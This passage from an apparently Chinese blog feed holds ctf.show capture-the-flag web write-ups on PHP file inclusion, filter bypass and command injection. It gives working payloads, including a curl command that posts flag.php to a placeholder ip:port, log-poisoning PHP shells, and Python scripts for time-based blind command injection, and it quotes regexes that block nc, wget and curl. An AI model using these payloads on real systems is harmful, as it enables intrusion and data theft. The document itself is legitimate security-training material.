class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line">    非预期</span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i'</span>,$file))&#123;<span class="comment">//禁用了convert，data等，但是放出了filter，不编码格式直接读</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/read=/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($num)</span></span>&#123;</span><br><span class="line">    $num=str_replace(<span class="string">"0x"</span>,<span class="string">"1"</span>,$num);<span class="comment">//十六进制被禁</span></span><br><span class="line">    $num=str_replace(<span class="string">"0"</span>,<span class="string">"1"</span>,$num);<span class="comment">//八进制被禁</span></span><br><span class="line">    $num=str_replace(<span class="string">"."</span>,<span class="string">"1"</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">"e"</span>,<span class="string">"1"</span>,$num);<span class="comment">//科学计数法</span></span><br><span class="line">    $num=str_replace(<span class="string">"+"</span>,<span class="string">"1"</span>,$num);</span><br><span class="line">    <span class="keyword">return</span> $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($num) <span class="keyword">and</span> $num!==<span class="string">'36'</span> <span class="keyword">and</span> trim($num)!==<span class="string">'36'</span> <span class="keyword">and</span> filter($num)==<span class="string">'36'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="string">'36'</span>)&#123;<span class="comment">//trim()过滤空格以及\n\r\t\v\0,不过滤\f</span></span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>转义字符绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=%<span class="number">0</span>c36<span class="comment">//%0c==\f</span></span><br></pre></td></tr></table></figure><h3 id="web123-126"><a href="#web123-126" class="headerlink" title="web123-126"></a>web123-126</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.freebuf.com/articles/web/213359.html</span></span><br><span class="line">register_argc_argv里面的trick(p神知识星球有讲)</span><br><span class="line">php字符串解析特性</span><br><span class="line"><span class="comment">#123 </span></span><br><span class="line">POST: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="keyword">echo</span> $flag </span><br><span class="line"></span><br><span class="line"><span class="comment">#125 </span></span><br><span class="line">GET:?<span class="number">1</span>=flag.php POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[<span class="number">1</span>]) </span><br><span class="line"></span><br><span class="line"><span class="comment">#126 </span></span><br><span class="line">GET:?a=<span class="number">1</span>+fl0g=flag_give_me POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php字符串解析特性</span><br><span class="line">GET:?ctf%<span class="number">20</span>show=ilove36d</span><br><span class="line">https:<span class="comment">//www.freebuf.com/articles/web/213359.html</span></span><br><span class="line">ctf%<span class="number">20</span>show==&gt;ctf_show</span><br></pre></td></tr></table></figure><h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$f1 = $_GET[<span class="string">'f1'</span>];</span><br><span class="line">$f2 = $_GET[<span class="string">'f2'</span>];</span><br><span class="line"><span class="keyword">if</span>(check($f1))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"嗯哼？"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">'/[0-9]|[a-z]/i'</span>, $str);</span><br><span class="line">&#125;<span class="comment">//check函数限制了能够使用的php函数，这里也就要用骚操作</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.php.net/manual/zh/book.gettext.php</span></span><br><span class="line">php手册中讲到的gettext()函数有个拓展函数_(),刚好能绕过check函数的检测</span><br><span class="line">payload</span><br><span class="line">f1=_&amp;f2=get_defined_vars  <span class="comment">#get_defined_vars()能够获取所有已定义变量组成的的数组</span></span><br></pre></td></tr></table></figure><h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'f'</span>]))&#123;</span><br><span class="line">    $f = $_GET[<span class="string">'f'</span>];</span><br><span class="line">    <span class="keyword">if</span>(stripos($f, <span class="string">'ctfshow'</span>)&gt;<span class="number">0</span>)&#123;<span class="comment">//匹配字符串中的ctfshow，且不能在起始位置</span></span><br><span class="line">        <span class="keyword">echo</span> readfile($f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到<code>readfile</code>函数，想到了路径穿越来读取flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">GET:?f=/ctfshow/../<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><h3 id="web130-131"><a href="#web130-131" class="headerlink" title="web130-131"></a>web130-131</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_match正则回溯溢出</span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">f=a*<span class="number">99999999</span>ctfshow</span><br><span class="line">f=a*<span class="number">9999999936</span>Dctfshow</span><br></pre></td></tr></table></figure><p>好像130可以直接绕过正则匹配，还得再看看</p><h3 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h3><p>扫到<code>robots.txt</code>，访问<code>/admin</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $username = (String)$_GET[<span class="string">'username'</span>];</span><br><span class="line">    $password = (String)$_GET[<span class="string">'password'</span>];</span><br><span class="line">    $code = (String)$_GET[<span class="string">'code'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($code === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; $password === $flag || $username ===<span class="string">"admin"</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>($code == <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>&amp;&amp;</code>前面为假即为假，<code>||</code>前面为真即为真</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:?username=admin&amp;password=&amp;code=admin</span><br></pre></td></tr></table></figure><h3 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($F = @$_GET[<span class="string">'F'</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/system|nc|wget|exec|passthru|netcat/i'</span>, $F))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($F,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"6个字母都还不够呀?!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//可以变量覆盖，传入本身执行命令</span></span><br><span class="line">payload:</span><br><span class="line">?F=`$F`;%<span class="number">20</span>curl -X POST -F <span class="string">'file=@flag.php;filename=xx'</span> ip:port</span><br><span class="line">关于curl命令 http:<span class="comment">//www.ruanyifeng.com/blog/2019/09/curl-reference.html</span></span><br></pre></td></tr></table></figure><h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key1'</span>]) || <span class="keyword">isset</span>($_GET[<span class="string">'key2'</span>]) || <span class="keyword">isset</span>($_POST[<span class="string">'key1'</span>]) || <span class="keyword">isset</span>($_POST[<span class="string">'key2'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"nonononono"</span>);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]);</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key1 == <span class="string">'36d'</span> &amp;&amp; $key2 == <span class="string">'36d'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="string">'flag.php'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?_POST[key1]=<span class="number">36</span>d&amp;_POST[key2]=<span class="number">36</span>d</span><br></pre></td></tr></table></figure><h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i'</span>, $F))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($F,<span class="number">0</span>,<span class="number">6</span>));</span><br></pre></td></tr></table></figure><p><code>curl</code>被过滤了，这里发现可以改名来访问，用<code>mv</code>命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F `;mv flag.php xx.txt</span><br></pre></td></tr></table></figure><h3 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">linux=&gt;tee Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</span><br><span class="line">?c=cat /f149_15_h3r3|tee xx</span><br></pre></td></tr></table></figure><h3 id="web137-138"><a href="#web137-138" class="headerlink" title="web137-138"></a>web137-138</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"private class"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">"flag.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//138多了下面的判断，没什么影响</span></span><br><span class="line"><span class="keyword">if</span>(strripos($_POST[<span class="string">'ctfshow'</span>], <span class="string">":"</span>)&gt;<span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"private function"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func($_POST[<span class="string">'ctfshow'</span>]);</span><br></pre></td></tr></table></figure><p>内部类没办法直接调用，用到<code>call_user_func</code>调用内部类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()可以调用类内部的方法</span><br><span class="line">调用类内部的函数需要使用数组方式 <span class="keyword">array</span>(类名，方法名)</span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">POST:ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</span><br></pre></td></tr></table></figure><h3 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span>, $x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'too young too simple sometimes naive!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反弹shell啥的都用不了，盲注，学习一波linux命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str = string.ascii_letters+string.digits+<span class="string">'_-'</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">print(str)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> str:</span><br><span class="line">            payload = <span class="string">"if [ `ls /|awk 'NR==&#123;0&#125;'|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi"</span>.format(i,j,n)</span><br><span class="line">            url=<span class="string">"http://d25d2d7b-ff4a-4e83-ad28-3a0848cfed5e.chall.ctf.show/?c="</span>+payload</span><br><span class="line">            print(url)</span><br><span class="line">            start = time.time()</span><br><span class="line">            res = requests.get(url)</span><br><span class="line">            end = time.time()</span><br><span class="line">            <span class="keyword">if</span> (end - start) &gt; <span class="number">2</span>:</span><br><span class="line">                result += n</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    result += <span class="string">" "</span></span><br><span class="line"><span class="comment">#awk 'NR==1'自己Linux试试就知道了</span></span><br></pre></td></tr></table></figure><p>注出文件名后注flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str = string.ascii_letters+string.digits+<span class="string">'_-'</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">print(str)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> str:</span><br><span class="line">        payload = <span class="string">"if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi"</span>.format(j,n)</span><br><span class="line">        url = <span class="string">"http://d25d2d7b-ff4a-4e83-ad28-3a0848cfed5e.chall.ctf.show/?c="</span> + payload</span><br><span class="line">        <span class="comment"># print(url)</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> (end-start) &gt; <span class="number">2</span>:</span><br><span class="line">            result += n</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h3 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'f1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'f2'</span>]))&#123;</span><br><span class="line">    $f1 = (String)$_POST[<span class="string">'f1'</span>];</span><br><span class="line">    $f2 = (String)$_POST[<span class="string">'f2'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]+$/'</span>, $f1))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]+$/'</span>, $f2))&#123;</span><br><span class="line">            $code = <span class="keyword">eval</span>(<span class="string">"return $f1($f2());"</span>);</span><br><span class="line">            <span class="keyword">if</span>(intval($code) == <span class="string">'ctfshow'</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="string">"flag.php"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用php弱比较内部类型转换机制，只要让<code>$code</code>的值为0即可，利用<code>md5</code>值为非纯数字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">md5(md5())</span><br><span class="line">md5(phpinfo())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>filecontains</title>
      <link href="/2020/09/24/filecontains/"/>
      <url>/2020/09/24/filecontains/</url>
      
        <content type="html"><![CDATA[<h3 id="filecontain"><a href="#filecontain" class="headerlink" title="filecontain"></a>filecontain<a id="more"></a></h3><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件包含，没有给出回显</p><p>尝试伪协议包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>匹配到php就会被替换，这里可以用data协议写入命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==</span></span><br><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span></span><br><span class="line">(attention:加密最好用本地工具，网上加密有区别)</span><br></pre></td></tr></table></figure><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>data协议也不能用了，这里想到可能可以通过写入日志文件进行包含来<code>getshell</code>，burp抓包修改UA</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line">UA:<span class="meta">&lt;?php</span> system(<span class="string">'ls'</span>);<span class="meta">?&gt;</span><span class="comment">//<span class="meta">&lt;?php</span> system('cat fl0g.php');<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><img src="/2020/09/24/filecontains/1.png" class=""><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多过滤了个冒号，上题方法打通</p><h3 id="web82-web86"><a href="#web82-web86" class="headerlink" title="web82-web86"></a>web82-web86</h3><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $content = $_POST[<span class="string">'content'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"."</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    file_put_contents(urldecode($file), <span 